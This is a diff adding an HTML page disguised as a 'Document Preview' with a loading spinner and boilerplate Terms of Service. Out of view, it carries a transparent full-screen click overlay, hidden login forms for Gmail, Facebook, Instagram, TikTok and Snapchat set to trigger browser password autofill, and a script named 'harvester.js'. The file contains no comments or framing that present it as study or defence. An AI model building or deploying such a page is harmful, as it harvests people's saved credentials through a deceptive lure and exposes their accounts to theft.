@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Document Preview</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      background-color: #f0f0f0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .preview-container {
+      background-color: white;
+      padding: 2rem;
+      border-radius: 5px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+    .agreement-container {
+      display: none; /* Hidden by default */
+      background-color: white;
+      padding: 2rem;
+      border-radius: 5px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      text-align: left;
+      max-width: 600px;
+      max-height: 80vh;
+      overflow-y: auto;
+    }
+    .agreement-container h2 {
+      margin-top: 0;
+    }
+    .agreement-container button {
+      display: block;
+      margin: 1rem auto 0;
+      padding: 0.5rem 1rem;
+      border: none;
+      background-color: #3498db;
+      color: white;
+      border-radius: 3px;
+      cursor: pointer;
+    }
+    .loader {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #3498db;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 2s linear infinite;
+      margin: 0 auto 1rem;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    #click-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background-color: rgba(0,0,0,0); /* Transparent */
+      z-index: 999; /* Make sure it's on top */
+    }
+  </style>
+</head>
+<body>
+  <div id="click-overlay"></div>
+  <div class="preview-container">
+    <div class="loader"></div>
+    <p>Loading document preview...</p>
+  </div>
+
+  <div class="agreement-container">
+    <h2>Terms of Service</h2>
+    <p>This is a binding legal agreement. Please read these Terms of Service ("Terms", "Terms of Service") carefully before using the service operated by us.</p>
+    <p>Your access to and use of the Service is conditioned on your acceptance of and compliance with these Terms. These Terms apply to all visitors, users and others who access or use the Service.</p>
+    <p>By accessing or using the Service you agree to be bound by these Terms. If you disagree with any part of the terms then you may not access the Service.</p>
+    <h3>Content</h3>
+    <p>Our Service allows you to post, link, store, share and otherwise make available certain information, text, graphics, videos, or other material ("Content"). You are responsible for the Content that you post to the Service, including its legality, reliability, and appropriateness.</p>
+    <p>By posting Content to the Service, you grant us the right and license to use, modify, publicly perform, publicly display, reproduce, and distribute such Content on and through the Service. You retain any and all of your rights to any Content you submit, post or display on or through the Service and you are responsible for protecting those rights. You agree that this license includes the right for us to make your Content available to other users of the Service, who may also use your Content subject to these Terms.</p>
+    <p>You represent and warrant that: (i) the Content is yours (you own it) or you have the right to use it and grant us the rights and license as provided in these Terms, and (ii) the posting of your Content on or through the Service does not violate the privacy rights, publicity rights, copyrights, contract rights or any other rights of any person.</p>
+    <h3>Accounts</h3>
+    <p>When you create an account with us, you must provide us information that is accurate, complete, and current at all times. Failure to do so constitutes a breach of the Terms, which may result in immediate termination of your account on our Service.</p>
+    <p>You are responsible for safeguarding the password that you use to access the Service and for any activities or actions under your password, whether your password is with our Service or a third-party service.</p>
+    <p>You agree not to disclose your password to any third party. You must notify us immediately upon becoming aware of any breach of security or unauthorized use of your account.</p>
+    <h3>Intellectual Property</h3>
+    <p>The Service and its original content (excluding Content provided by users), features and functionality are and will remain the exclusive property of us and its licensors. The Service is protected by copyright, trademark, and other laws of both the country and foreign countries. Our trademarks and trade dress may not be used in connection with any product or service without the prior written consent of us.</p>
+    <h3>Links To Other Web Sites</h3>
+    <p>Our Service may contain links to third-party web sites or services that are not owned or controlled by us.</p>
+    <p>We have no control over, and assumes no responsibility for, the content, privacy policies, or practices of any third party web sites or services. You further acknowledge and agree that we shall not be responsible or liable, directly or indirectly, for any damage or loss caused or alleged to be caused by or in connection with use of or reliance on any such content, goods or services available on or through any such web sites or services.</p>
+    <p>We strongly advise you to read the terms and conditions and privacy policies of any third-party web sites or services that you visit.</p>
+    <h3>Termination</h3>
+    <p>We may terminate or suspend your account immediately, without prior notice or liability, for any reason whatsoever, including without limitation if you breach the Terms.</p>
+    <p>Upon termination, your right to use the Service will immediately cease. If you wish to terminate your account, you may simply discontinue using the Service.</p>
+    <h3>Governing Law</h3>
+    <p>These Terms shall be governed and construed in accordance with the laws of the land, without regard to its conflict of law provisions.</p>
+    <p>Our failure to enforce any right or provision of these Terms will not be considered a waiver of those rights. If any provision of these Terms is held to be invalid or unenforceable by a court, the remaining provisions of these Terms will remain in effect. These Terms constitute the entire agreement between us regarding our Service, and supersede and replace any prior agreements we might have between us regarding the Service.</p>
+    <h3>Changes</h3>
+    <p>We reserve the right, at our sole discretion, to modify or replace these Terms at any time. If a revision is material we will try to provide at least 30 days notice prior to any new terms taking effect. What constitutes a material change will be determined at our sole discretion.</p>
+    <p>By continuing to access or use our Service after those revisions become effective, you agree to be bound by the revised terms. If you do not agree to the new terms, please stop using the Service.</p>
+    <h3>Contact Us</h3>
+    <p>If you have any questions about these Terms, please contact us.</p>
+    <button>Accept</button>
+  </div>
+
+  <div style="display: none;">
+    <form id="gmail-form">
+      <input type="email" name="email" autocomplete="username" />
+      <input type="password" name="password" autocomplete="current-password" />
+    </form>
+    <form id="facebook-form">
+      <input type="text" name="username" autocomplete="username" />
+      <input type="password" name="password" autocomplete="current-password" />
+    </form>
+    <form id="instagram-form">
+        <input type="text" name="username" autocomplete="username" />
+        <input type="password" name="password" autocomplete="current-password" />
+    </form>
+    <form id="tiktok-form">
+        <input type="text" name="username" autocomplete="username" />
+        <input type="password" name="password" autocomplete="current-password" />
+    </form>
+    <form id="snapchat-form">
+        <input type="text" name="username" autocomplete="username" />
+        <input type="password" name="password" autocomplete="current-password" />
+    </form>
+  </div>
+  <script src="harvester.js?v=2"></script>
+</body>
+</html>
